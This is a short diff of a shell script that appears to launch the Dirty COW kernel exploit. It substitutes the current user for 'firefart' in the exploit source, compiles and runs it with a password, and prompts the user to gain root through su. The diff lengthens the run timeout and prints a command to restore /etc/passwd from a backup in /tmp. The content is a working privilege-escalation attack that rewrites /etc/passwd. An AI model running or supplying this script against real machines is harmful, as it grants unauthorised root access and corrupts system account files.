@@ -12,8 +12,7 @@ sed -i "s/firefart/$USER/g" $SRC
 
 gcc $SRC -o $COWNAME -lcrypt -lpthread
 
-timeout 10s ./$COWNAME $PASSWORD
+timeout 15s ./$COWNAME $PASSWORD
 
 echo "Try access root with su ($USER:$PASSWORD)"
-
-# mv /tmp/passwd.bak /etc/passwd
+echo "To restore use: mv /tmp/passwd.bak /etc/passwd"
